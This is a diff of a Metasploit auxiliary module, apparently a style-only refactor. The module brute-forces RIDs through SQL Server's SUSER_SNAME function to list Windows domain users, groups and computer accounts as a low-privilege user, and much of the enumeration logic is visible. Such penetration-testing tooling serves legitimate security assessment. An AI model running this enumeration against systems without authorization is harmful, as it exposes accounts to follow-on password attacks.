@@ -8,40 +8,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration',
-      'Description' => %q{
-        This module can be used to bruteforce RIDs associated with the domain of the SQL Server
-        using the SUSER_SNAME function. This is similar to the smb_lookupsid module, but executed
-        through SQL Server queries as any user with the PUBLIC role (everyone). Information that
-        can be enumerated includes Windows domain users, groups, and computer accounts. Enumerated
-        accounts can then be used in online dictionary attacks.
-      },
-      'Author'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration',
+        'Description' => %q{
+          This module can be used to bruteforce RIDs associated with the domain of the SQL Server
+          using the SUSER_SNAME function. This is similar to the smb_lookupsid module, but executed
+          through SQL Server queries as any user with the PUBLIC role (everyone). Information that
+          can be enumerated includes Windows domain users, groups, and computer accounts. Enumerated
+          accounts can then be used in online dictionary attacks.
+        },
+        'Author' => [
           'nullbind <scott.sutherland[at]netspi.com>',
           'antti <antti.rantasaari[at]netspi.com>'
         ],
-      'License'     => MSF_LICENSE,
-      'References'  => [[ 'URL','https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql']]
-    ))
+        'License' => MSF_LICENSE,
+        'References' => [[ 'URL', 'https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql']],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
-        OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 10000]),
-      ])
+        OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 10_000]),
+      ]
+    )
   end
 
   def run
     # Check connection and issue initial query
     print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
-    if mssql_login_datastore
-      print_good('Connected.')
-    else
+
+    unless mssql_login_datastore
       print_error('Login was unsuccessful. Check your credentials.')
       disconnect
       return
     end
+
+    print_good('Connected.')
 
     # Get the server name
     sql_server_name = get_sql_server_name
@@ -53,13 +62,13 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Could not recover the SQL Server's domain.")
       disconnect
       return
-    else
-      print_status("Domain Name: #{sql_server_domain}")
     end
+
+    print_status("Domain Name: #{sql_server_domain}")
 
     # Check if the domain and hostname are the same
     if sql_server_name == sql_server_domain
-      print_error("The SQL Server does not appear to be part of a Windows domain.")
+      print_error('The SQL Server does not appear to be part of a Windows domain.')
       disconnect
       return
     end
@@ -70,9 +79,9 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Could not recover the SQL Server's domain sid.")
       disconnect
       return
-    else
-      print_good("Found the domain sid: #{windows_domain_sid}")
     end
+
+    print_good("Found the domain sid: #{windows_domain_sid}")
 
     # Get a list of windows users, groups, and computer accounts using SUSER_NAME()
     print_status("Brute forcing #{datastore['FuzzNum']} RIDs through the SQL Server, be patient...")
@@ -94,8 +103,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # Create table for report
     windows_domain_login_table = Rex::Text::Table.new(
-      'Header'  => 'Windows Domain Accounts',
-      'Ident'   => 1,
+      'Header' => 'Windows Domain Accounts',
+      'Ident' => 1,
       'Columns' => ['name']
     )
 
@@ -106,10 +115,10 @@ class MetasploitModule < Msf::Auxiliary
 
     # Create output file
     this_service = report_service(
-      :host  => mssql_client.peerhost,
-      :port => mssql_client.peerport,
-      :name => 'mssql',
-      :proto => 'tcp'
+      host: mssql_client.peerhost,
+      port: mssql_client.peerport,
+      name: 'mssql',
+      proto: 'tcp'
     )
     file_name = "#{mssql_client.peerhost}-#{mssql_client.peerport}_windows_domain_accounts.csv"
     path = store_loot(
@@ -119,23 +128,22 @@ class MetasploitModule < Msf::Auxiliary
       windows_domain_login_table.to_csv,
       file_name,
       'Domain Users enumerated through SQL Server',
-      this_service)
+      this_service
+    )
     print_status("Query results have been saved to: #{path}")
   end
 
   # Get list of windows accounts,groups,and computer accounts
   def get_win_domain_users(windows_domain_sid)
-
     # Create array to store the windws accounts etc
     windows_logins = []
 
     # Fuzz the principal_id parameter passed to the SUSER_NAME function
     (500..datastore['FuzzNum']).each do |principal_id|
-
       # Convert number to hex and fix order
-      principal_id_hex = "%02X" % principal_id
-      principal_id_hex_pad = (principal_id_hex.size.even? ? principal_id_hex : ("0"+ principal_id_hex))
-      principal_id_clean  = principal_id_hex_pad.scan(/(..)/).reverse.flatten.join
+      principal_id_hex = '%02X' % principal_id
+      principal_id_hex_pad = (principal_id_hex.size.even? ? principal_id_hex : ('0' + principal_id_hex))
+      principal_id_clean = principal_id_hex_pad.scan(/(..)/).reverse.flatten.join
 
       # Add padding
       principal_id_hex_padded2 = principal_id_clean.ljust(8, '0')
@@ -159,7 +167,7 @@ class MetasploitModule < Msf::Auxiliary
       windows_login = parse_results[0][0]
 
       # Print account,group,or computer account etc
-      if windows_login.length != 0
+      if !windows_login.empty?
         print_status(" - #{windows_login}")
 
         vprint_status("Test sid: #{win_sid}")
@@ -175,9 +183,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # Get windows domain
   def get_windows_domain
-
     # Setup query to check the domain
-    sql = "SELECT DEFAULT_DOMAIN() as mydomain"
+    sql = 'SELECT DEFAULT_DOMAIN() as mydomain'
 
     # Run query
     result = mssql_query(sql)
@@ -192,9 +199,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # Get the sql server's hostname
   def get_sql_server_name
-
     # Setup query to check the server name
-    sql = "SELECT @@servername"
+    sql = 'SELECT @@servername'
 
     # Run query
     result = mssql_query(sql)
@@ -210,7 +216,6 @@ class MetasploitModule < Msf::Auxiliary
 
   # Get windows domain
   def get_windows_domain_sid(sql_server_domain)
-
     # Set group
     domain_group = "#{sql_server_domain}\\Domain Admins"
 
@@ -226,7 +231,7 @@ class MetasploitModule < Msf::Auxiliary
     domain_sid = object_sid[0..47]
 
     # Return if sid does not resolve for a domain
-    if domain_sid.length == 0
+    if domain_sid.empty?
       return nil
     end
 
